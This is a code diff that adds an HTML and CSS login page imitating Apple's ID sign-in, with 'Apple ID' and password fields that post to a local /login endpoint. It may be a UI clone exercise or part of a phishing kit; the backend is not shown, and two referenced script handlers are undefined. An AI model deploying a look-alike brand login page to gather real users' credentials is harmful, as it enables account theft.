@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+    
+    <head>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+            <meta name='viewport' content='initial-scale=1, viewport-fit=cover'>
+                <style>
+                    .staysignedin{
+                        width: 130px;
+                        margin: auto;
+                        align-content: center;
+                    }
+                body{
+                    background: linear-gradient(to bottom right, blue, red);
+                    background-repeat: no-repeat;
+                    height: 100%;
+                    margin: 0;
+                    background-attachment: fixed;
+                }
+                
+                @font-face {
+                    font-family: "SFDisplay";
+                    font-weight: 400;
+                    src: url("https://sf.abarba.me/SF-UI-Display-Regular.otf");
+                }
+                .div{
+                    height: auto;
+                    width:350px;
+                    margin: auto;
+                    margin-top: 40vh;
+                    margin-bottom: 40vh;
+                    padding-bottom: 140px;
+                    padding-top: 130px;
+                    background-color: white;
+                    align-content: center;
+                    padding-left: 10px;
+                    padding-right: 10px;
+                    border-radius: 3px;
+                    -webkit-box-shadow: 1px 1px 1px 1px;
+                    
+                }
+                .emailInput{
+                    height: 30px;
+                    width: 340px;
+                    border-color:transparent;
+                    border-top-left-radius: 5px;
+                    border-top-right-radius: 5px;
+                    background-color: transparent;
+                    margin:0px;
+                    font-family: SFDisplay
+                }
+                .passwordInput{
+                    height: 30px;
+                    width: 315px;
+                    border-color:transparent;
+                    border-bottom-left-radius: 5px;
+                    background-color: transparent;
+                    margin: 0px;
+                    margin-bottom: 0px;
+                    margin-top: 0px;
+                    position: relative;
+                    top:0px;
+                    left: 0px;
+                    font-family: SFDisplay
+                }
+                .upper{
+                    height: auto;
+                    border-top-left-radius: 5px;
+                    border-top-right-radius: 5px;
+                    border: 1px solid #a4a4a4;
+                    border-bottom-color: #cdcdcd;
+                    padding: 0px;
+                    margin-bottom: 0px;
+                }
+                .lower{
+                    height:auto;
+                    border-bottom-left-radius: 5px;
+                    border-bottom-right-radius: 5px;
+                    border: 1px solid #a4a4a4;
+                    border-top-color: #cdcdcd;
+                    padding: 0px;
+                    margin-top: 0px;
+                    margin-bottom: 10px;
+                }
+                .submitButton{
+                    margin: 0px;
+                    padding: 0px;
+                    border:0px;
+                    background-color: transparent;
+                    vertical-align: -4px;
+                    
+                }
+                input:focus{
+                    outline: none;
+                }
+                
+                i{
+                    transform: scale(1.2, 1.2);
+                }
+                #icon{
+                    color: gray;
+                }
+                .stay{
+                    font-family: SFDisplay;
+                    margin-top: 10px;
+                }
+                .checkbox{
+                    padding: 0px;
+                    margin: 0px;
+                    border: 10px solid black;
+                    
+                }
+                
+                
+                    </style>
+                
+                </head>
+    
+    <body>
+        
+        <div class="div">
+            
+            <form class="form" target="_self" method="post" action="/login" onsubmit="submitted()">
+                
+                <div class="upper" name="upper" id="upper">
+                    <input type="email" class="emailInput" placeholder="Apple ID" required autofocus autocomplete="email" name="emailInput" onfocus="emailFocus()" onfocusout="emailFocusOut()">
+                        </div>
+                <div class="lower" name="lower" id="lower">
+                    <input type="password" class="passwordInput" placeholder="Password" required name="passwordInput" onfocus="passwordFocus()" onfocusout="passwordFocusOut()">
+                        <button class = "submitButton" onclick="submitClicked()"><i class="fa fa-arrow-circle-right fa-2x" id="icon"></i>
+                            
+                        </button>
+                        </div>
+                
+                
+                
+                
+                <div class = "staysignedin">
+                    <label class="stay"><input type="checkbox" class="checkbox" font-family = "SFDisplay" name="signedin">Stay Signed In</label></div>
+            </form>
+            
+            
+            
+            
+            
+            
+            
+            
+        </div>
+        
+        
+        <script>
+            
+            function emailFocus(){
+                document.getElementById("upper").style.borderColor = "#1666fa";
+            }
+        function emailFocusOut(){
+            document.getElementById("upper").style.borderColor = "#a4a4a4";
+            document.getElementById("upper").style.borderBottomColor = "#cdcdcd";
+        }
+        function passwordFocus(){
+            document.getElementById("lower").style.borderColor = "#1666fa";
+        }
+        function passwordFocusOut(){
+            document.getElementById("lower").style.borderColor = "#a4a4a4";
+            document.getElementById("lower").style.borderTopColor = "#cdcdcd";
+        }
+        
+            </script>
+        
+    </body>
+    
+    
+    
+    
+    
+    
+    
+</html>
+
